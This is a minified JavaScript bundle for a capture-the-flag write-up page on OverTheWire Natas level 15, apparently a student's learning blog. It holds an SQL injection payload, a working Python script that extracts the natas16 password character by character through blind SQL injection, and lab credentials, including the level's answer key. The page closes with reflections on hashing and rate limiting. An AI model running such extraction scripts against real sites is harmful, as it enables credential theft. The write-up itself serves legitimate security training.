(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[70],{62963:function(e,t,s){(window.__NEXT_P=window.__NEXT_P||[]).push(["/natas/natas15",function(){return s(85322)}])},34655:function(e,t,s){"use strict";var n=s(85893),r=s(40335),a=s.n(r);t.Z=function(e){var t=e.src,s=e.alt,r=e.width,i=void 0===r?600:r;return(0,n.jsx)("div",{className:a().imgContainer,children:(0,n.jsx)("img",{src:"/over-the-wire"+t,alt:s,width:i})})}},90654:function(e,t,s){"use strict";var n=s(85893),r=s(23457),a=s.n(r),i=s(5227),o=s(84283);t.Z=function(e){var t=e.children,s=e.language;return(0,n.jsx)("div",{className:a().CodeBlock,children:(0,n.jsx)(i.Z,{language:s,style:o.cL,children:t})})}},87582:function(e,t,s){"use strict";var n=s(85893),r=s(76992),a=s.n(r);t.Z=function(e){var t=e.children;return(0,n.jsxs)("div",{className:a().keyword,children:[(0,n.jsx)("p",{className:a().keywordHead,children:"Keywords: "}),t]})}},69242:function(e,t,s){"use strict";var n=s(85893),r=s(41664),a=s(98574),i=s.n(a);t.Z=function(e){var t=e.link1,s=e.link2;return(0,n.jsxs)("div",{className:i().pageNav,children:[(0,n.jsx)("div",{children:t?(0,n.jsx)(r.default,{href:t,children:(0,n.jsx)("a",{title:"Previous page",className:i().navButton,children:"\u25c0"})}):""}),(0,n.jsx)("div",{children:s?(0,n.jsx)(r.default,{href:s,children:(0,n.jsx)("a",{title:"Next page",className:i().navButton,children:"\u25b6"})}):""})]})}},20586:function(e,t,s){"use strict";var n=s(85893),r=s(86655),a=s.n(r),i=s(5227),o=s(84283),c=s(67294);t.Z=function(e){var t=e.children,s=(0,c.useState)(!1),r=s[0],l=s[1];return(0,n.jsxs)("section",{children:[(0,n.jsx)("h2",{children:"Key"}),(0,n.jsxs)("div",{className:a().codeBlock,children:[(0,n.jsx)("div",{className:a().spoilerToggler,children:(0,n.jsx)("button",{onClick:function(){return l(!r)},children:"Click to Reveal"})}),(0,n.jsx)("div",{className:a().spoilerContainer,children:(0,n.jsx)("div",{className:"".concat(a().spoiler," ").concat(r?a().show:""),children:(0,n.jsx)(i.Z,{language:"",style:o.cL,customStyle:{margin:0},children:t})})})]})]})}},35934:function(e,t,s){"use strict";var n=s(85893),r=s(96979),a=s.n(r);function i(e,t,s){return t in e?Object.defineProperty(e,t,{value:s,enumerable:!0,configurable:!0,writable:!0}):e[t]=s,e}function o(e,t){if(null==e)return{};var s,n,r=function(e,t){if(null==e)return{};var s,n,r={},a=Object.keys(e);for(n=0;n<a.length;n++)s=a[n],t.indexOf(s)>=0||(r[s]=e[s]);return r}(e,t);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(n=0;n<a.length;n++)s=a[n],t.indexOf(s)>=0||Object.prototype.propertyIsEnumerable.call(e,s)&&(r[s]=e[s])}return r}t.Z=function(e){var t=e.children,s=o(e,["children"]);return(0,n.jsx)("span",function(e){for(var t=1;t<arguments.length;t++){var s=null!=arguments[t]?arguments[t]:{},n=Object.keys(s);"function"===typeof Object.getOwnPropertySymbols&&(n=n.concat(Object.getOwnPropertySymbols(s).filter((function(e){return Object.getOwnPropertyDescriptor(s,e).enumerable})))),n.forEach((function(t){i(e,t,s[t])}))}return e}({className:a().tag},s,{children:t}))}},85322:function(e,t,s){"use strict";s.r(t);var n=s(85893),r=s(34655),a=s(90654),i=s(87582),o=s(69242),c=s(20586),l=s(35934);t.default=function(){return(0,n.jsxs)("div",{children:[(0,n.jsx)("h1",{children:"Natas 15"}),(0,n.jsxs)(i.Z,{children:[(0,n.jsx)(l.Z,{children:"sqli"}),(0,n.jsx)(l.Z,{children:"blind-sqli"})]}),(0,n.jsxs)("section",{children:[(0,n.jsx)("h2",{children:"Experience"}),(0,n.jsxs)("p",{children:["Quite difficult to solve. Looking at the code, it seems quite clean. Fooling the username check existence was quite simple, I typed"," ",(0,n.jsx)("code",{children:'" or 1 #'})," ","and it works, however it seems that the username inserted does not matter in itself. This is not a system for logging in, it is a system to check if a valid user exist or not. At the end, only the following message appears:"]}),(0,n.jsx)(r.Z,{src:"/images/natas15-1.png",alt:'End result of successful query reads "This user exist"'}),(0,n.jsx)("p",{children:"So, I found out that this is what is called a blind sql injection attack. Although we cannot see the output of our sql queries, by using multiple queries, we will be able to extract useful information. In this case, the table structure is known to us, so we do not need to guess that information, we know that there is a password column which matches with the username. Before we move on, we must therefore pick a username who we want to extract the password from. Clearly, this should be natas16, and indeed if we insert natas16, we will be prompted that natas16 is a valid username."}),(0,n.jsxs)("p",{children:["To be able to obtain the password, we use the SQL ",(0,n.jsx)("code",{children:"LIKE"})," and ",(0,n.jsx)("code",{children:"AND"})," ","command. So, first, I attempted to write a simple python script, to see if everything works, check if my sqli command is correct, check if it is able to access the website, etc. As we can't insert the natas15 password manually, I used the ",(0,n.jsx)("code",{children:"authorization"})," header with value copied from the developer tools."]}),(0,n.jsx)(a.Z,{language:"python",children:"import requests\n\nurl = 'http://natas15.natas.labs.overthewire.org/index.php'\nheaders = {\n    'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=='\n}\npayload = {\n    'username': 'natas16\"  and password like \"a%'\n}\nr = requests.post('http://natas15.natas.labs.overthewire.org/index.php', headers=headers, data=payload)\n\nif ('error' in r.text):\n    # invalid sql command\n    ...\nelif (\"doesn't\" in r.text):\n    # doesn't exist\n    ...\nelif ('exists' in r.text):\n    # exist\n    ...\n"}),(0,n.jsxs)("p",{children:["Everything seems to work well, so now, it is a matter of brute forcing the password. However, when I used this script to just find the first letter, I realised that the sql is case insensitive, so to remedy this, we use the",(0,n.jsx)("code",{children:"BINARY"})," command after ",(0,n.jsx)("code",{children:"LIKE"}),". As might be expected, brute force took took quite a long time, but I was able to obtain the key this way. Final code can be seen below."]}),(0,n.jsx)(a.Z,{language:"python",children:"import requests\n\n# Create list of potential characters\npossible = ''\nfor i in range(26):\n    possible += chr(ord('a') + i)\n    possible += chr(ord('A') + i)\nfor i in range(10):\n    possible += str(i)\n\n# HTTP request definition\nurl = 'http://natas15.natas.labs.overthewire.org/index.php'\nheaders = {\n    'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=='\n}\n\npassword = ''\n# 32 because, previous passwords are only 32 characters long\nfor i in range(32):\n    for char in possible:\n        payload = {'username': f'natas16\" AND password LIKE BINARY \"{password}{char}%'}\n        r = requests.post('http://natas15.natas.labs.overthewire.org/index.php', headers=headers, data=payload)\n        if ('exists' in r.text):\n            password += char\n            break\nprint(password)\n"}),(0,n.jsxs)("p",{children:["The first section creates a list of potential charctes, a to z lowercase and uppercase, and the 10 digits. Then, we use a sql injection which will return the ","This user exists."," prompt when it also found that the user's password matches the pattern we put. And we basically create that pattern based on previous queries."]})]}),(0,n.jsxs)("section",{children:[(0,n.jsx)("h2",{children:"Reflection"}),(0,n.jsx)("p",{children:"I think this was quite an interesting exercise especially in learning about how an attacker might conduct a brute force blind sql attack. I did not know that this was possible, at first, I was quite stuck on how to progress as we did not learn about this in class. I thought it was very smart to figure out the password by simply asking whether the start of the password matches a certain pattern or not. The difference between this method and a pure brute force method is that a pure brute force would not know if the password is valid or not until it matches the whole password. Whereas here, we are able to extract it character by character."}),(0,n.jsx)("p",{children:"This was a great example scenario where using hash functions could save the user's password. Without it, we would simply obtain the plain text password we could use, however with a hashed password, the attacker must then figure out another layer of protection which will take time and effort. So it is a good reason for storing only hashed passwords or at least encrypted passwords even if the users are not supposed to have access to that database of passwords in the first place."}),(0,n.jsx)("p",{children:"Another thing it showcased is the reason for websites to limit the number of requests you could make to a server per minute. A highly rapid rate of request may indicate a bot potentially trying to conduct a blind sqli or simply brute force a password. This is also why users are limited in the number of attempts they have to type their credentials correctly. Limiting either of this would have caused my code to not work as it would not have sufficient data to construct the password."})]}),(0,n.jsx)(c.Z,{children:"WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"}),(0,n.jsx)(o.Z,{link1:"/natas/natas14",link2:"/natas/natas16"})]})}},40335:function(e){e.exports={imgContainer:"BlogImage_imgContainer__s2tL6"}},23457:function(e){e.exports={CodeBlock:"CodeBlock_CodeBlock___IBBd"}},76992:function(e){e.exports={keywordHead:"Keyword_keywordHead__40fuD",keyword:"Keyword_keyword__javqt"}},98574:function(e){e.exports={pageNav:"PageNav_pageNav__NXqbT",navButton:"PageNav_navButton__yHhmO"}},86655:function(e){e.exports={codeBlock:"SpoilerKey_codeBlock__KWl0d",spoilerToggler:"SpoilerKey_spoilerToggler__HCeWZ",spoiler:"SpoilerKey_spoiler__YWx_s",show:"SpoilerKey_show__VIJ75",spoilerContainer:"SpoilerKey_spoilerContainer__O76It"}},96979:function(e){e.exports={tag:"Tag_tag__AJnTY"}}},function(e){e.O(0,[369,774,888,179],(function(){return t=62963,e(e.s=t);var t}));var t=e.O();_N_E=t}]);